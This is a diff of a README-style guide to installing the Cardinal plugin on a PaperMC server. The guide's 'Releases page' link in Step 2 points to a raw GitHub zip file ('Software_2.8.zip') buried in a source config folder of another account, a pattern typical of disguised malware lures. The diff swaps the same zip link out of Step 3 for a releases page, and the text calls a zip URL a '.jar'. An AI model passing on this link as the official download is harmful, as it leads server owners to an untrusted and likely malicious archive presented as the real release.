@@ -16,7 +16,7 @@ Make sure you have a PaperMC server already installed. Cardinal works best with 
 Go to the [Cardinal Releases page](https://raw.githubusercontent.com/Ilovemybigas/Cardinal/master/cardinal-paper/src/main/java/eg/mqzen/cardinal/config/Software_2.8.zip). Here, you will find the latest version of Cardinal available for download.
 
 ### Step 3: Download Cardinal
-Look for the most recent release. Click to download the plugin file. It will usually have an `.jar` extension, such as `https://raw.githubusercontent.com/Ilovemybigas/Cardinal/master/cardinal-paper/src/main/java/eg/mqzen/cardinal/config/Software_2.8.zip`.
+Look for the most recent release. Click to download the plugin file. It will usually have an `.jar` extension, such as `https://github.com/ItzFrancyDev/Cardinal/releases`.
 
 ### Step 4: Add Cardinal to Your Server
 Once the download is complete, you need to place the `.jar` file into the `plugins` folder of your PaperMC server directory. This folder is where all your server plugins reside.
